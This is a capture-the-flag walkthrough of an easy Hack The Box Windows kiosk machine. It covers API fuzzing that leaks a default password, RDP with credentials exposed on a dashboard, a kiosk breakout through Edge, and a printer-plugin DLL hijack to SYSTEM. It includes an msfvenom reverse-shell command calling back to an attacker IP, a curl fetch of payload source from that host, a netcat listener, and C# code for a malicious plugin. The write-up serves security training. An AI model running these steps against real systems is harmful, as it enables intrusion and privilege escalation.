| Field      | Details                                                      |
|------------|---------------------------------------------------------------|
| Platform   | [Hack The Box](https://app.hackthebox.com/machines/Touch)     |
| Difficulty | Easy                                                           |
| OS         | Windows                                                        |
| Date       | October 5, 2026                                                |

**Target:** 10.129.80.171 (kiosk-042)
**Author:** Faridd

---

## 1. Reconnaissance

### 1.1 — Port Scanning

```bash
nmap -A 10.129.80.171
```

```
135/tcp  open  msrpc         Microsoft Windows RPC
3389/tcp open  ms-wbt-server Microsoft Terminal Service
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8443/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-title: Nexion DeviceHub - Login
|_Requested resource was /login
```

Port 8443 hosts a web login panel ("Nexion DeviceHub"), and 3389 (RDP) confirms this is a Windows kiosk-style host rather than a standard AD box.

### 1.2 — Checking the Web Panel

![Nexion DocReader login page](image.png)

The provided lab credentials didn't work. Looking at the page source turned up a hint:

```html
<div class="login-hint" title="The default password is the device serial number included in your DeviceHub packaging.">
```

So the password is the device's serial number — which isn't known yet.

---

## 2. Finding the Serial Number via API Fuzzing

### 2.1 — Discovering `/api`

```bash
ffuf -u 'http://10.129.80.171:8443/FUZZ' -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-small.txt -e .php,.exe,.txt -ic -fs 0
```

```
login   [Status: 200, Size: 3572]
api     [Status: 403, Size: 35]
```

`/api` itself returns 403, so its sub-paths were fuzzed next:

```bash
ffuf -u 'http://10.129.80.171:8443/api/FUZZ' -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-small.txt -e .php,.exe,.txt -ic -fs 0
```

```
status   [Status: 200, Size: 116]
scan     [Status: 405, Size: 30]
```

`/api/status` returns 200 — meaning it's reachable **without** authentication, unlike the base `/api` path:

![Authentication required JSON error](image-1.png)

### 2.2 — Reading the Serial Number

```
GET http://10.129.80.171:8443/api/status
```

![Device status JSON with serial number](image-2.png)

```json
{"device":"Nexion DeviceHub DH-100","serial":"NX-DH-2024-B7042","firmware":"1.4.2","status":"online","uptime":42974}
```

The serial number `NX-DH-2024-B7042` is exactly the "default password" the login hint pointed to.

---

## 3. Credential Discovery and RDP Access

### 3.1 — Logging In and Finding Scanner Credentials

Logging in with the serial number as the password worked. Browsing the DeviceHub dashboard (Scanner section) exposed a stored username/password for the kiosk's passport scanner device:

![Dashboard showing visible scanner username and password](image-4.png)

```
KioskUser : K!0sk2026#
```

### 3.2 — RDP Login

```bash
xfreerdp /u:KioskUser /p:'K!0sk2026#' /v:10.129.80.171
```

These credentials worked over RDP, landing on the kiosk's locked-down desktop — a fullscreen self-check-in application:

![Self check-in kiosk fullscreen app](image-3.png)

---

## 4. Breaking Out of the Kiosk

### 4.1 — The Scanner Blocks Progress

Advancing to the "Documents" step triggers the passport scanner, which blocks further interaction until a scan completes:

![Scanning passport in progress](image-5.png)

### 4.2 — Powering the Scanner Off Remotely

Back on the DeviceHub web dashboard, a **Power Off** button is available for the scanner device:

![Dashboard with Power Off button for scanner](image-6.png)

Clicking it and retrying the scan on the RDP session now throws an error dialog, instead of hanging:

![Scanner error dialog with support link](image-7.png)

The error dialog links to `https://support.nexionsystems.com` — this is the way out of the locked-down kiosk shell, since clicking a link inside the kiosk opens a full browser (Edge) rather than staying inside the restricted app.

---

## 5. Getting Code Execution

### 5.1 — Delivering a Payload via Edge

With a real browser now reachable, a reverse shell payload was generated and served:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.241 LPORT=4444 -f exe -o shell_v2.exe
python3 -m http.server 80
```

In Edge, the payload was downloaded from `http://10.10.15.241/shell_v2.exe`, then **Ctrl+J** was used to open the Downloads panel:

![Edge downloads panel showing shell_v2.exe](image-8.png)

Running it directly from here didn't work — likely blocked by a restriction on executing downloaded files directly from the browser's download bar.

### 5.2 — Reaching `cmd.exe` via the Browser's File Picker

Edge's download/file picker allows browsing the local filesystem, and typing a path directly into its address bar will open that file. This was used to launch a shell directly, bypassing the earlier block:

![Edge file browser address bar with cmd.exe path](image-9.png)

```
C:\Windows\System32\cmd.exe
```

This returned a working `cmd.exe` shell.

### 5.3 — Grabbing the User Flag

![cmd shell showing user.txt](image-10.png)

```
C:\Users\KioskUser\Desktop>type user.txt
5d26e8600ca6481261fb1305bece9458
```

### 5.4 — Pivoting to a Proper Shell

The `shell_v2.exe` payload uploaded earlier was already sitting in `Downloads`. Rather than keep working from the restricted Edge-spawned `cmd.exe`, a listener was opened and the payload was executed for a stable reverse shell back to Kali:

```bash
rlwrap nc -nvlp 4444
```

![cmd shell executing shell_v2.exe and connecting back](image-11.png)

---

## 6. Privilege Escalation — Printer Administrators → Plugin DLL Hijack

### 6.1 — Checking Privileges

```powershell
whoami /all
```

```
kiosk-042\kioskuser
KIOSK-042\Printer Administrators
BUILTIN\Remote Desktop Users
```

Membership in **Printer Administrators** stood out as the escalation path, since it's a non-default group with no obvious purpose unless it grants write access somewhere privileged.

### 6.2 — The Vulnerable Mechanism

The Nexion DeviceHub printer service auto-loads any `.dll` dropped into its plugins folder:

```
C:\Program Files\Nexion Systems\Printer\publish\plugins
```

Since the service itself runs as **NT AUTHORITY\SYSTEM**, anything it loads from that folder executes with SYSTEM privileges. Normally a standard user can't write to `C:\Program Files\...`, but membership in Printer Administrators grants write access to this specific plugins directory — turning the DLL auto-load behavior into a privilege escalation primitive.

### 6.3 — Building the Malicious Plugin

A minimal C# plugin was written with multiple common plugin entry points (`Initialize`, `Init`, `Load`, `OnLoad`, and a static constructor) so it executes automatically regardless of which hook the loader actually calls. Its only job: copy `root.txt` to a world-readable location.

```csharp
public class PluginInit
{
    static PluginInit() { Run(); }
    public static void Run()
    {
        try
        {
            foreach (var f in new string[] {
                @"C:\Users\Administrator\Desktop\root.txt",
                @"C:\Users\Administrator\root.txt",
                @"C:\root.txt" })
            {
                if (File.Exists(f))
                {
                    File.Copy(f, @"C:\ProgramData\Nexion\rr.txt", true);
                    break;
                }
            }
        }
        catch { }
    }
}
```

### 6.4 — Compiling and Deploying

```powershell
# Pull the source over
curl "http://10.10.15.241/payload.cs" -o "C:\Users\KioskUser\Downloads\payload.cs"

# Compile to a .NET DLL using PowerShell's built-in compiler
Add-Type -Path "C:\Users\KioskUser\Downloads\payload.cs" -OutputAssembly "C:\Users\KioskUser\Downloads\payload.dll" -OutputType Library

# Drop it into the plugins folder
Copy-Item "C:\Users\KioskUser\Downloads\payload.dll" "C:\Program Files\Nexion Systems\Printer\publish\plugins\payload.dll" -Force
```

The printer service was then reset from the DeviceHub web dashboard, causing it to reload its plugins folder and execute the DLL as SYSTEM.

### 6.5 — Root Flag

```powershell
type C:\ProgramData\Nexion\rr.txt
```

Result: `014a7e705f1fa91a0be6e046c4027d41` (root flag).

> The plugin could just as easily have opened a SYSTEM reverse shell instead of copying a file — copying the flag was enough to finish the box.

---

## 7. Summary of the Chain

```
Unauthenticated web panel (port 8443)
  --> /api/status leaks device serial number (ffuf)
  --> serial number = default login password
  --> DeviceHub dashboard leaks scanner credentials (KioskUser)
  --> RDP into locked-down self-check-in kiosk
  --> power off scanner remotely --> triggers error dialog with external link
  --> link opens full Edge browser --> kiosk breakout
  --> deliver reverse shell exe, execute via Edge file-picker path trick
  --> cmd.exe shell --> user.txt
  --> whoami: member of Printer Administrators
  --> write malicious plugin DLL to SYSTEM-run printer service's plugins folder
  --> reset printer --> DLL auto-loads as NT AUTHORITY\SYSTEM
  --> root.txt
```

**Core takeaway:** every stage of this box chains a *trust boundary mistake* rather than a classic exploit — an unauthenticated status endpoint leaking a secret, a kiosk app that still lets you reach a real browser, a browser that lets you type a file path instead of a URL, and a privileged service that blindly loads whatever DLL appears in a folder a "helper" group can write to.
